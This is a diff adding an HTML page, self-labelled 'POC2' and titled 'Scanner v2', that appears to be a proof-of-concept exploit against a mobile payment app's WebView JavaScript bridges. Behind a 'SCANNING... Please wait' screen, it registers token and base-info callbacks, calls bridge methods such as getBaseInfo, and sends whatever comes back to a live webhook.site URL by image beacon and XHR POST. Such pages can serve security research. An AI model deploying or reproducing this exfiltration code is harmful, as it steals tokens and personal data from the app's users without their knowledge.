@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner v2</title>
+</head>
+
+<body style="background: green; color: white; font-family: sans-serif; text-align: center; padding: 20px;">
+    <h1 id="status">SCANNING...</h1>
+    <p>Please wait...</p>
+    <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.5;"></div>
+
+    <script>
+        (function () {
+            var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
+            var status = document.getElementById('status');
+            var logDiv = document.getElementById('log');
+
+            function report(msg) {
+                logDiv.innerHTML += '<div>' + msg + '</div>';
+                new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&v=2&ts=' + Date.now();
+            }
+
+            function exfil(obj) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK, true);
+                xhr.send(JSON.stringify(obj));
+            }
+
+            report('POC2 LOADED');
+
+            // Define callbacks
+            var cbs = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'opayCallback'];
+            cbs.forEach(function (n) {
+                window[n] = function (d) {
+                    report('CALLBACK: ' + n);
+                    exfil({ cb: n, data: d });
+                    status.innerText = 'SUCCESS';
+                };
+            });
+
+            // Scan bridges
+            setTimeout(function () {
+                var targets = ['control', 'OPay3PartyContext', 'webkit'];
+                targets.forEach(function (t) {
+                    if (window[t]) report('FOUND: ' + t);
+
+                    // Try postMessage
+                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[t]) {
+                        report('POST: ' + t);
+                        window.webkit.messageHandlers[t].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
+                    }
+
+                    // Try direct call
+                    if (window[t] && window[t].getBaseInfo) {
+                        try {
+                            var res = window[t].getBaseInfo();
+                            report('DIRECT: ' + t);
+                            exfil({ bridge: t, data: res });
+                        } catch (e) { }
+                    }
+                });
+            }, 1000);
+        })();
+    </script>
+</body>
+
+</html>
